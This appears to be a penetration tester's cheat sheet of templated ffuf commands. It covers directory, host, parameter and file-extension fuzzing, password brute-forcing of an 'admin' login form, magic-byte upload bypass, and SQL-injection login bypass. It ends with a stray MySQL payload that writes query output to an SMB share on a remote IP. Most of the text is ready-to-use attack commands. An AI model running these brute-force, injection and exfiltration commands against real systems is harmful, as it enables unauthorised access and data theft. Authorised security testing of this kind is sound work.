
# ffuf

% fuzzer, fuzz, ffuf
#plateform/linux #target/remote #cat/ATTACK/FUZZ

## _help 
```
https://www.acceis.fr/astuces-avancees-avec-ffuf/
```

## _postprocess - json commandline
```bash
cat <ffuf_json_out|ffuf.json> | jq '(.commandline)'
```

## _postprocess - filter  code
```bash
cat <ffuf_json_out|ffuf.json> | jq '.results[] | select(.status == <http_code|200>) | (.status |tostring)+" - "+.url' 
```

## _postprocess - filter  keyword
```bash
cat ffuf.json | jq '.results[] | select((.input.FUZZ | @base64d)  == "upload")'
```

## _logging (json)
```bash
-s -mc all -o <ffuf_json_out|ffuf.json> -of <ejson>
```

## GET/POST - request file
```bash
ffuf -replay-proxy http://127.0.0.1:8080-t <nb_thread|40> -w <ffuf_dir_wl>:FUZZ -request $(pwd)/<http_request_file> -request-proto <proto|http> -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## GET - Hosts 
```bash
ffuf -t <nb_thread|40> -w <ffuf_dns_wl>:FUZZ -u <url> -H "Host: FUZZ.<domain_fqdn>" -mc all -fs <response_size> -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## GET - uri 
```bash
ffuf -replay-proxy http://127.0.0.1:8080 -t <nb_thread|40> -w <ffuf_dir_wl>:FUZZ -u <url>/FUZZ -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## GET - uri (recursive)
```bash
ffuf -replay-proxy http://127.0.0.1:8080 -t <nb_thread|40> -w <ffuf_dir_wl>:FUZZ -u <url>/FUZZ -recursion -recursion-depth <depth|1> -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## GET - file (extension)
```bash
ffuf -replay-proxy http://127.0.0.1:8080 -t <nb_thread|40> -w <ffuf_dir_wl>:FUZZ -u <url>/FUZZ -e .<ext1>[,.ext2] -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## GET - parameter fuzzing
```bash
ffuf -replay-proxy http://127.0.0.1:8080 -t <nb_thread|40> -w <ffuf_param_wl>:FUZZ -u <url>?FUZZ=1 -fs <response_size> -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## GET - parameter value fuzzing
```bash
ffuf -replay-proxy http://127.0.0.1:8080 -t <nb_thread|40> -w <wordlist>:FUZZ -u <url>?<param>=FUZZ -fs <response_size> -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## POST - form
```bash
ffuf -replay-proxy http://127.0.0.1:8080 -t <nb_thread|40> -w <wordlist>:FUZZ -u <url> -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d "username=admin\&password=FUZZ"  -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## POST - Magic bytes upload 
```bash
ffuf -replay-proxy http://127.0.0.1:8080 -t <nb_thread|40> -w <(while read h; do echo $(echo $h | xxd -r -p); done < /opt/wordlists/custom/magic_bytes_hex.txt) -request $(pwd)/<http_request_file> -request-proto http -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

## Login bypass (SQL injection)
```bash
ffuf -replay-proxy http://127.0.0.1:8080 -request <request_file> -w <ffuf_sqli_wl>:<param_value> -request-proto <proto|http> -mc all  -fr 'Invalid Credentials' -o <ffuf_json_out|ffuf$(date +"%Y%m%d-%H-%M-%S").json> -of <ejson>
```

SELECT @@version INTO OUTFILE '\\\\10.10.14.6\\jubaz\\out.txt';